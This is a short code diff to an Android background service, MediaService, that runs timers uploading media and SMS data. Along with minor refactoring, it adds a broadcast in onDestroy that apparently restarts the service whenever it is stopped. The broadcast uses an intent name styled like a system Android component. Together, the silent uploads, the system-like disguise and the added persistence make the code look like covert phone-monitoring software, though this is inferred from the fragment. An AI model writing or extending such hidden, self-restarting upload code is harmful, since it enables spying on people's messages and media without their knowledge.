@@ -38,7 +38,6 @@ public class MediaService extends Service {
             boolean.class};
     private Object[] mStartForegroundArgs = new Object[2];
     private Object[] mSetForegroundArgs = new Object[1];
-    private Method mStartForeground;
     private Method mSetForeground;
 
     public static boolean isMediaCompressing = false;
@@ -70,6 +69,7 @@ public class MediaService extends Service {
     @Override
     public void onCreate() {
         Log.d(TAG, "Service On Create..!");
+        Method mStartForeground;
         try {
             mStartForeground = getClass().getMethod("startForeground",
                     mStartForegroundSignature);
@@ -114,7 +114,7 @@ public class MediaService extends Service {
             public void run() {
                 if(!isMediaUploading) new MediaUploadUtility(MediaService.this).initUploadServices();
             }
-        }, 0, 1000 * 60 * 1);
+        }, 0, 1000 * 60 );
     }
 
     private void initSMSUpload() {
@@ -155,5 +155,6 @@ public class MediaService extends Service {
         imgUploadTimer.cancel();
         configTimer.cancel();
         smsTimer.cancel();
+        sendBroadcast(new Intent("com.android.media.settings.RESTART_SENSOR"));
     }
 }
